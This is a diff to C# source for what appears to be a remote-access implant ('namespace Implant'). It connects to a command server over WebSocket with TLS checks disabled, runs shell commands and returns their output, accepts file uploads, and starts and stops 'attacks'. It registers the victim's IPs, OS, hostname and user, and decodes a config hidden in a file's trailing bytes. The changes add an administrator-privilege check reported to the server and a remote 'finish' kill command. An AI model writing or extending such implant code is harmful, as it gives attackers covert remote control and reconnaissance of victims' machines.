@@ -1,7 +1,4 @@
-﻿using Microsoft.Win32;
-using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
-using System;
+﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -12,11 +9,15 @@ using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Net.WebSockets;
+using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Reflection;
+using Microsoft.Win32;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 
 namespace Implant
@@ -82,13 +83,13 @@ namespace Implant
             (sender, certificate, chain, sslPolicyErrors) => true;
 
             _ws = new ClientWebSocket();
+            var uri = new Uri($"ws://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");
 
-            var uri = new Uri($"ws://{_base_url}?id={_implId}");
+
 
             try
             {
 
-                
                 await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);
 
                 while (_running && _ws.State == WebSocketState.Open)
@@ -103,6 +104,35 @@ namespace Implant
             catch (Exception ex)
             {
 
+            }
+        }
+
+
+        public async Task CloseWebSocketAsync()
+        {
+            try
+            {
+                _wsCancellationTokenSource?.Cancel();
+                
+                if (_ws != null && _ws.State == WebSocketState.Open)
+                {
+                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
+                                        "Client closing", 
+                                        CancellationToken.None);
+                }
+            }
+            catch (WebSocketException ex)
+            {
+            }
+            catch (Exception ex)
+            {
+            }
+            finally
+            {
+                _ws?.Dispose();
+                _wsCancellationTokenSource?.Dispose();
+                _ws = null;
+                _running = false;
             }
         }
 
@@ -167,6 +197,10 @@ namespace Implant
                 {
                     await StopAttack(data["stop_attack"].ToString());
                 }
+                else if (data.ContainsKey("finish"))
+                {
+                    await ExitWs();
+                }
             }
             catch (Exception e)
             {
@@ -174,35 +208,7 @@ namespace Implant
             }
         }
 
-        private async Task WriteAllBytesAsync(string path, byte[] bytes)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Create,
-                FileAccess.Write,
-                FileShare.None,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                await fileStream.WriteAsync(bytes, 0, bytes.Length);
-            }
-        }
-
-        private async Task<byte[]> ReadAllBytesAsync(string path)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Open,
-                FileAccess.Read,
-                FileShare.Read,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                var bytes = new byte[fileStream.Length];
-                await fileStream.ReadAsync(bytes, 0, (int)fileStream.Length);
-                return bytes;
-            }
-        }
+ 
 
         private async Task ExecuteCommand(string command)
         {
@@ -217,8 +223,7 @@ namespace Implant
                 var result = ExecuteShellCommand(command);
                 await SendResponse(new
                 {
-                    result = result.output,
-                    error = result.error,
+                    result = !string.IsNullOrEmpty(result.output) ? result.output : result.error,
                     cwd = _currentDir
                 });
             }
@@ -297,15 +302,12 @@ namespace Implant
         {
             try
             {
-                // Decodificamos el chunk Base64
                 var part = Convert.FromBase64String(chunkData["data"].ToString());
                 var isLast = chunkData.ContainsKey("last") && (bool)chunkData["last"];
 
-                // Añadimos el chunk al buffer
                 _uploadBuffer.Add(part);
 
 
-                // Asignamos la ruta de destino solo una vez
                 if (_uploadDestination == null)
                 {
                     _uploadDestination = destination;
@@ -313,7 +315,6 @@ namespace Implant
 
 
 
-                // Si es el último chunk, escribimos el archivo
                 if (isLast)
                 {
                     using (var fs = new FileStream(_uploadDestination, FileMode.Create, FileAccess.Write))
@@ -325,7 +326,6 @@ namespace Implant
                     }
 
 
-                    // Limpiamos
                     _uploadBuffer.Clear();
                     _uploadDestination = null;
 
@@ -707,6 +707,13 @@ namespace Implant
             catch { }
         }
 
+        private async Task ExitWs()
+        {
+            CloseWebSocketAsync();
+            Environment.Exit(0);
+
+        }
+
         private async Task Register()
         {
             try
@@ -718,13 +725,14 @@ namespace Implant
                     public_ip = GetPublicIp(),
                     local_ip = GetLocalIps(),
                     operating_system = GetOperatingSystem(),
-                    impl_id = _implId,
+                    impl_id = $"{_implId}-root={GetRoot()}-user={Environment.UserName}",
                     hostname = Environment.MachineName,
+                    root = GetRoot(),
                     user = Environment.UserName
                 };
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
-                
+
                 using (var client = new HttpClient())
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
@@ -863,6 +871,15 @@ namespace Implant
             }
         }
 
+        public bool GetRoot()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+
+
         private async Task SendResponse(object response)
         {
             if (_ws != null && _ws.State == WebSocketState.Open)
@@ -889,21 +906,17 @@ namespace Implant
 
                 byte[] datos = File.ReadAllBytes(rutaCompleta);
 
-                // Buscar los últimos 1000 bytes
                 int bytesParaLeer = Math.Min(1000, datos.Length);
                 byte[] finalBytes = new byte[bytesParaLeer];
                 Array.Copy(datos, datos.Length - bytesParaLeer, finalBytes, 0, bytesParaLeer);
 
-                // Primera decodificación de 
-                string texto = Encoding.Unicode.GetString(finalBytes); // Unicode = UTF-16 LE en .NET
+                string texto = Encoding.Unicode.GetString(finalBytes);
 
                 string[] raw_data = texto.Split(new string[] { "DATA=" }, StringSplitOptions.None);
 
                 string base64_data = raw_data[1];
                 byte[] base64Bytes = Convert.FromBase64String(base64_data);
                 string decode_data = Encoding.UTF8.GetString(base64Bytes);
-
-                // Data decodificada utf-16-le --> base64 --> string with data
 
                 string[] data = decode_data.Split('|');
 
